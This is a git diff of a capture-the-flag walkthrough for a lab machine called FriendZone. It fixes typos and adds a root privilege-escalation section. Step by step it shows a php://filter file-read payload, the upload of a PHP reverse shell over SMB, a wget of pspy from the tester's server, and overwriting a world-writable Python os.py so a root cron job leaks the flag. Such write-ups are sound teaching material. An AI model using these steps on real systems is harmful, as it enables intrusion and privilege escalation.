@@ -508,7 +508,7 @@ Notes:
      Notes:
      - The __Development share__ is still empty
      
-   - Try to read the source code of __uploads.php__
+   - Try to read the source code of __upload.php__
      ```
      /dashboard.php?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=../uploads/upload
      ```
@@ -577,7 +577,7 @@ Notes:
      
    - Upload PHP reverse shell
      - Download shell from [pentestmonkey](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
-     - Update values __$ip__ and __$port__
+     - Update values of __$ip__ and __$port__
      - Upload to the __Development share__
        ```console
        smbclient \\\\WORKGROUP\\Development -c "put shell.php shell.php" -I 10.10.10.123 -N
@@ -635,4 +635,98 @@ Notes:
      ```
 ---
 ## PART 4 : Privilege Escalation (friend -> root)
+1. Download and upload [pspy](https://github.com/DominicBreuker/pspy)
+   1. Check system architecture of FriendZone
+      ```console
+      uname -op
+      # x86_64 GNU/Linux
+      ```
+      Notes:
+      - The system runs on 64-bit
+   2. Upload [pspy64](https://github.com/DominicBreuker/pspy/releases/download/v1.0.0/pspy64) to FriendZone
+      - Local terminal:
+        ```console
+        python -m SimpleHTTPServer
+        # Serving HTTP on 0.0.0.0 port 8000 ...
+        ```
+      - FriendZone terminal:
+        ```console
+        wget http://10.10.12.72:8000/pspy64
+        
+        chmod +x pspy64
+        ```
+2. Run __pspy64__
+   ```console
+   ./pspy64
+   # ...
+   # 54:01 CMD: UID=0    PID=7356   | /bin/sh -c /opt/server_admin/reporter.py 
+   # 54:01 CMD: UID=0    PID=7355   | /bin/sh -c /opt/server_admin/reporter.py 
+   # 54:01 CMD: UID=0    PID=7354   | /usr/sbin/CRON -f
+   # ...
+   # 56:01 CMD: UID=0    PID=7456   | /bin/sh -c /opt/server_admin/reporter.py 
+   # 56:01 CMD: UID=0    PID=7455   | /bin/sh -c /opt/server_admin/reporter.py 
+   # 56:01 CMD: UID=0    PID=7454   | /usr/sbin/CRON -f 
+   # ...
+   # 58:02 CMD: UID=0    PID=7540   | /bin/sh -c /opt/server_admin/reporter.py 
+   # 58:02 CMD: UID=0    PID=7539   | /bin/sh -c /opt/server_admin/reporter.py 
+   # 58:02 CMD: UID=0    PID=7538   | /usr/sbin/CRON -f
+   # ...
+   ```
+   Notes:
+   - There is a script called __reporter.py__
+   - It runs every two minutes
+3. Check __reporter.py__
+   ```console
+   cat /opt/server_admin/reporter.py
+   ```
+   ```python
+   #!/usr/bin/python
+
+   import os
+
+   to_address = "admin1@friendzone.com"
+   from_address = "admin2@friendzone.com"
+
+   print "[+] Trying to send email to %s"%to_address
+
+   #command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''
+
+   #os.system(command)
+
+   # I need to edit the script later
+   # Sam ~ python developer
+   ```
+   Notes:
+   - The script runs in python2.7
+   - Maybe we can override the __os__ library
    
+4. Override the __os__ library
+   - Check the directory of __reporter.py__
+     ```console
+     ls -la /opt | grep server_admin
+     # drwxr-xr-x  2 root root 4096 Jan 24 00:57 server_admin
+     ```
+     Notes:
+     - Non-root users cannot write to the directory
+   - Check where __os.py__ is saved
+     ```console
+     find / -name os.py 2>/dev/null
+     # /usr/lib/python3.6/os.py
+     # /usr/lib/python2.7/os.py
+     
+     ls -la /usr/lib/python2.7/os.py
+     # -rwxrwxrwx 1 root root 25912 Apr 17 08:33 /usr/lib/python2.7/os.py
+     ```
+     Notes:
+     - __os.py__ could be overwritten by anyone
+   - Overwrite __os.py__
+     ```console
+     echo "infile = open(\"/root/root.txt\", \"r\").read()" > /usr/lib/python2.7/os.py
+     echo "outfile = open(\"/tmp/root.txt\", \"w\").write(infile)" >> /usr/lib/python2.7/os.py
+     echo "outfile.close()" >> /usr/lib/python2.7/os.py
+     ```
+5. After __reporter.py__ runs again:
+   ```console
+   cat /tmp/root.txt
+   # b0e6c60b82cf96e9855ac1656a9e90c7
+   ```
